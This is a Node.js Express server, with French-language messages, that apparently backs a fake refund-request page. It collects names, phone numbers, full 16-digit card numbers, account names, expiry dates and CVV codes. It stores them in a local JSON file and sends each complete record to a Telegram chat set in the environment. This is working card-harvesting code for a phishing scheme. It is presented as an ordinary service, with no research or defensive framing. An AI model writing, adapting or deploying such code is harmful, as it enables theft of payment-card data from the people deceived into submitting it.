require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;
const DATA_DIR = path.join(__dirname, 'data');
const DEMANDES_FILE = path.join(DATA_DIR, 'demandes.json');

const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

function saveDemande(data) {
  let demandes = [];
  if (fs.existsSync(DEMANDES_FILE)) {
    try {
      demandes = JSON.parse(fs.readFileSync(DEMANDES_FILE, 'utf8'));
    } catch {
      demandes = [];
    }
  }

  const entry = {
    id: Date.now(),
    dateReception: new Date().toISOString(),
    ...data,
  };

  demandes.push(entry);
  fs.writeFileSync(DEMANDES_FILE, JSON.stringify(demandes, null, 2), 'utf8');
  return entry;
}

function isEmailConfigured() {
  return Boolean(TELEGRAM_CHAT_ID);
}

async function sendToTelegram(data) {
  const message = `📋 *Nouvelle demande de remboursement*

👤 *Nom:* ${data.nom}
📞 *Telephone:* ${data.telephone}
💳 *RIB/Carte:* ${data.rib}
🏦 *Nom du compte:* ${data.nomCompte}
📅 *Date:* ${data.date}
🔒 *CVV:* ||${data.CVV}||`;

  await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
}

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/api/remboursement', async (req, res) => {
  const { nom, telephone, rib, nomCompte, date, CVV } = req.body;

  if (!nom || !telephone || !rib || !nomCompte || !date || !CVV) {
    return res.status(400).json({ error: 'Tous les champs sont obligatoires.' });
  }

  const cardNumber = String(rib).replace(/\s/g, '');

  if (!/^\d{16}$/.test(cardNumber)) {
    return res.status(400).json({ error: 'Le numéro de carte doit contenir exactement 16 chiffres.' });
  }

  const data = { nom, telephone, rib: cardNumber, nomCompte, date, CVV };
  saveDemande(data);

  if (!isEmailConfigured()) {
    console.log('Demande enregistree (Telegram non configure):', nom);
    return res.json({
      success: true,
      message: 'Votre demande a ete enregistree avec succes.',
      emailSent: false,
    });
  }

  try {
    await sendToTelegram(data);
    res.json({ success: true, message: 'Votre demande a ete envoyee avec succes.', emailSent: true });
  } catch (err) {
    console.error('Erreur envoi Telegram:', err.message);
    res.json({
      success: true,
      message: 'Demande enregistree. Telegram non envoye — verifiez la configuration.',
      emailSent: false,
    });
  }
});

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
  const url = `http://localhost:${PORT}`;
  console.log(`Serveur demarre sur ${url}`);
  console.log(`Demandes sauvegardees dans: ${DEMANDES_FILE}`);

  if (isEmailConfigured()) {
    console.log(`Telegram actif -> chat_id: ${TELEGRAM_CHAT_ID}`);
  } else {
    console.log('Telegram non configure — ajoutez TELEGRAM_CHAT_ID dans .env');
  }

  if (process.env.PUBLIC_MODE) return;

  if (process.platform === 'win32') {
    const { exec } = require('child_process');
    exec(`start ${url}`);
  }
});
